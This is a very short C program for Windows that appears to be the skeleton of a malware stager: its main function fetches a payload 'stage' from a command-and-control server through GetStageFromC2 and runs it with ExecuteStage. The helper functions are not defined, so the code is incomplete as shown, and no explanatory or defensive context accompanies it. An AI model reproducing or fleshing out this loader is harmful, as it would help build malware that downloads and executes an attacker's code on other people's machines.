#include <windows.h>
#include <stdio.h>

int main()
{
    CHAR* Stage;
    DWORD StageSize;

    Stage = GetStageFromC2(&StageSize);
    ExecuteStage(Stage, StageSize);

    return;
}